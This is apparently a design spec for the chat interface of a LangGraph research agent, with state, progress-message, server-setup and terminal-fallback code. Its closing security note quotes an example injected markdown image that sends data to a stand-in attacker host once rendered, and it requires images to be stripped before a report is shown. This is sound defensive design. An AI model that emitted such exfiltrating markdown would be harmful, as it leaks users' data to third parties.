# 12 — Interface

**Priority: P0.**

Primary interface is [Agent Chat UI](https://github.com/langchain-ai/agent-chat-ui),
a Next.js chat frontend that talks to a LangGraph server. A Rich terminal renderer
is kept as a fallback and as the path the eval harness uses.

## Why Agent Chat UI

Three things come free that would otherwise be hand-written:

- **Interrupts render natively.** The clarification questions from spec 02 appear
  as a prompt with an input, and resuming the thread works without writing any
  resume plumbing.
- **Tool calls and results render.** Any tool the extraction agent calls shows its
  arguments and return value inline.
- **Threads persist.** Runs can be reopened, and the server handles checkpointing.

## The mismatch, and the bridge

Agent Chat UI is **message-centric**. It renders `messages`, tool calls, and
interrupts. It knows nothing about the `trace` list or the `claims` list from
spec 01, so with no changes the interface sits idle for the entire retrieval phase
and then emits a report.

There is a sharper version of this problem. Verification is a graph node, and a
node produces no message at all — so the step the whole design turns on is the one
that looks like nothing is happening. The bridge is not optional.

**Add a messages channel to state** (amends spec 01):

```python
from langchain.messages import AIMessage
from langgraph.graph import add_messages

class ResearchState(TypedDict, total=False):
    messages: Annotated[list, add_messages]
    ...
```

**Emit progress as messages from each node.** Every node already builds `trace`
events; render them to a short block and return both.

```python
def progress(events: list[dict]) -> list[AIMessage]:
    """One compact status message per node."""
    lines = []
    for e in events:
        match e["kind"]:
            case "plan":   lines.append(f"**Brief.** {e['brief']}")
            case "search": lines.append(f"`search` {e['query']} → {e['n_results']}")
            case "fetch":  lines.append(f"`fetch` {e['url'][:60]}")
            case "verdict":
                icon = {"supported": "✓", "unsupported": "✗",
                        "quote_not_found": "⚠"}[e["verdict"]]
                lines.append(f"{icon} {e['claim_text'][:70]}"
                             + ("" if e["verdict"] == "supported"
                                else f"\n  ↳ _{e['reason']}_"))
    return [AIMessage(content="\n".join(lines))] if lines else []


async def verify_node(state, *, store, llm):
    verified = await asyncio.gather(*[verify_claim(c, store, llm)
                                      for c in state["claims"]])
    events = [ev("verdict", claim_id=c.id, claim_text=c.text,
                 verdict=c.verdict, reason=c.verdict_reason) for c in verified]
    return {"claims": Overwrite(verified),
            "trace": events,
            "messages": progress(events)}
```

`trace` stays the machine-readable channel — the eval harness and any future
non-chat surface read it. `messages` is the human-readable projection. Keeping
both means the UI choice is not baked into the graph.

**One message per node, not per event.** `add_messages` appends, and a message per
fetch turns the transcript into a wall. Batch each node's events into one block.

## Running it

The graph must be served by a LangGraph server rather than invoked in-process.

```json
// langgraph.json
{
  "dependencies": ["."],
  "graphs": {
    "research": "./src/graph.py:graph"
  },
  "env": ".env"
}
```

The server imports a module attribute and cannot pass constructor arguments, so
anything that needs to vary per run travels on the input payload rather than
through the graph id.

```bash
pip install "langgraph-cli[inmem]"
langgraph dev                       # serves on http://localhost:2024
```

Then either point the hosted UI at the local server (no Node toolchain needed):

- open `agentchat.vercel.app`
- Deployment URL `http://localhost:2024`, Graph ID `research`
- no LangSmith key required for a local server

or run the frontend locally to avoid the external dependency:

```bash
npx create-agent-chat-app --project-name research-ui
cd research-ui && pnpm install && pnpm dev
```

## Checkpointer conflict

**Do not pass `checkpointer=` to `.compile()` when running under `langgraph dev`.**
The server supplies persistence and a compile-time checkpointer conflicts with it.
The same graph still needs one when the eval harness invokes it directly, so make
it conditional:

```python
def build_graph(*, served: bool = False, **deps):
    b = StateGraph(ResearchState)
    ...
    return b.compile() if served else b.compile(checkpointer=InMemorySaver())


# module-level attribute referenced by langgraph.json
graph = build_graph(served=True)
```

## Terminal fallback

Kept, because it has fewer moving parts and because the eval harness drives the
graph directly with no server involved.

```python
async for mode, chunk in graph.astream(payload, config,
                                       stream_mode=["updates", "messages"]):
    if mode == "updates":
        for _node, delta in chunk.items():
            for event in delta.get("trace", []):
                ui.emit(event)
    elif mode == "messages":
        token, _meta = chunk
        ui.stream_token(token.text)
```

```python
ICONS = {"supported": "[green]✓[/]", "unsupported": "[red]✗[/]",
         "quote_not_found": "[yellow]⚠[/]"}
```

Rejections are rendered distinctly in both interfaces on purpose: the rate at
which claims fail verification is the health signal for the pipeline, and a spike
usually means a bad extraction prompt or a backend returning junk.

## Fast profile

A full run is 1–4 minutes. A reduced profile keeps interactive use and smoke tests
tolerable:

```python
FAST = Budget(max_rounds=1, max_topics=2, max_searches=4, max_fetches=4)   # ~45s
FULL = Budget(max_rounds=2, max_topics=5, max_searches=12, max_fetches=18)
```

Under a served graph this is read at construction, or carried on the input payload
if it needs to vary per run.

## Security note

Agent Chat UI renders markdown. Report content is assembled from web-derived
sources, so the image-stripping rule from spec 08 is load-bearing here rather than
belt-and-braces — an injected `![](https://attacker/?d=…)` that survives to the
report becomes a live outbound GET the moment it renders. Strip images in
`synthesize_node`, before the content reaches state.

## Acceptance

- `langgraph dev` starts and the graph loads without a compile-time checkpointer.
- Progress messages appear during retrieval, not only at synthesis.
- Every claim's verdict is visible in the UI, including the rejections.
- Clarification interrupts render and resume from the UI.
- The terminal path still works for eval runs with no server running.
- No image markdown reaches the rendered report.
